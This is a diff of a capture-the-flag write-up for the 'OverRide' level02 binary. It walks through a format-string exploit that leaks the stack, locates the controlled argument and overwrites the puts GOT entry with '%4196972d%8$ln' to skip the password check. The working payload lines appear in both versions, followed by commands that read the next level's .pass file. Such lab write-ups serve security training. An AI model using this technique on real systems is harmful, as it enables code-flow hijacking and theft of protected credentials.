@@ -1,53 +1,30 @@
-level02@OverRide:~$ cat <(python -c 'print  "%lx-" * 20') <(python -c 'print "B" * 123 ')  | ./level02
-===== [ Secure Access System v1.0 ] =====
-/***************************************\
-| You must login to access this system. |
-\**************************************/
---[ Username: --[ Password: *****************************************
-7fffffffdd00-0-42-2a2a2a2a2a2a2a2a-2a2a2a2a2a2a2a2a-7fffffffdef8-1f7ff9a08-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-4242424242424242-100424242- does not have access!
-pos of 42424242424 : #8 
+In <main> function the <printf> call at 0x0000000000400aa2 is not secure and directly prints what's in [rbp-0x70].
+We can see that this call is followed by a call to <puts>.
 
-   0x0000000000400a9a <+646>:	mov    rdi,rax
-   0x0000000000400a9d <+649>:	mov    eax,0x0
-   0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt> <<-- this one 
-   0x0000000000400aa7 <+659>:	mov    edi,0x400d3a
-   0x0000000000400aac <+664>:	call   0x400680 <puts@plt>
-   0x0000000000400ab1 <+669>:	mov    edi,0x1
-   0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>
+$ (gdb) disas main
+...
+0x0000000000400a96 <+642>:	lea    rax,[rbp-0x70]
+0x0000000000400a9a <+646>:	mov    rdi,rax
+0x0000000000400a9d <+649>:	mov    eax,0x0
+0x0000000000400aa2 <+654>:	call   0x4006c0 <printf@plt>
+0x0000000000400aa7 <+659>:	mov    edi,0x400d3a
+0x0000000000400aac <+664>:	call   0x400680 <puts@plt>
+0x0000000000400ab1 <+669>:	mov    edi,0x1
+0x0000000000400ab6 <+674>:	call   0x400710 <exit@plt>
 
-there is the password on the stack so we just need to overwrite the got puts : 
+Via this <printf>, we see that we control the 8th argument on the stack.
 
-gdb-peda$ pd 0x400680
-Dump of assembler code from 0x400680 to 0x4006a0::	Dump of assembler code from 0x400680 to 0x4006a0:
-   0x0000000000400680 <puts@plt+0>:	jmp    QWORD PTR [rip+0x200b5a]        # 0x6011e0 <puts@got.plt>  <<--------------- here the add
-   0x0000000000400686 <puts@plt+6>:	push   0x1
-   0x000000000040068b <puts@plt+11>:	jmp    0x400660
-   0x0000000000400690 <fread@plt+0>:	jmp    QWORD PTR [rip+0x200b52]        # 0x6011e8 <fread@got.plt>
-   0x0000000000400696 <fread@plt+6>:	push   0x2
-   0x000000000040069b <fread@plt+11>:	jmp    0x400660
-End of assembler dump.
+The idea is to replace the call to <puts> by the call to <printf> located at 0x0000000000400a6c.
 
-PASSWD = python -c 'print "\x00\x00\x00\x00\x00\x60\x11\xe0"[::-1] '
+We dump the GOT to get the address of <puts>
 
-we need to jump after the check of psswd : 
+$ objdump -R ./level02
+...
+00000000006011e0 R_X86_64_JUMP_SLOT  puts
+...
 
-   0x0000000000400a63 <+591>:	call   0x400670 <strncmp@plt>
-   0x0000000000400a68 <+596>:	test   eax,eax
-   0x0000000000400a6a <+598>:	jne    0x400a96 <main+642>
-   0x0000000000400a6c <+600>:	mov    eax,0x400d22   <<<<----- right here
-   0x0000000000400a71 <+605>:	lea    rdx,[rbp-0x70]
-   0x0000000000400a75 <+609>:	mov    rsi,rdx
-   0x0000000000400a78 <+612>:	mov    rdi,rax
-   0x0000000000400a7b <+615>:	mov    eax,0x0
-   0x0000000000400a80 <+620>:	call   0x4006c0 <printf@plt>
-   0x0000000000400a85 <+625>:	mov    edi,0x400d32
-   0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
-   0x0000000000400a8f <+635>:	mov    eax,0x0
-   0x0000000000400a94 <+640>:	leave
+0x0000000000400a6c = 4196972
 
-0x0000000000400a6a = 4196972
-
-USERNAME = python -c 'print  "%4196972d%8$ln"'
-
-level02@OverRide:~$ cat <(python -c 'print  "%4196972d%8$ln"') <(python -c 'print "\x60\x11\xe0"[::-1] ') - | ./level02
-
+$ cat <(python -c "print('%4196972d%8\$ln')") <(python -c "print('\x00\x00\x00\x00\x00\x60\x11\xe0'[::-1])") - | ./level02
+cd /home/user/level03
+cat .pass
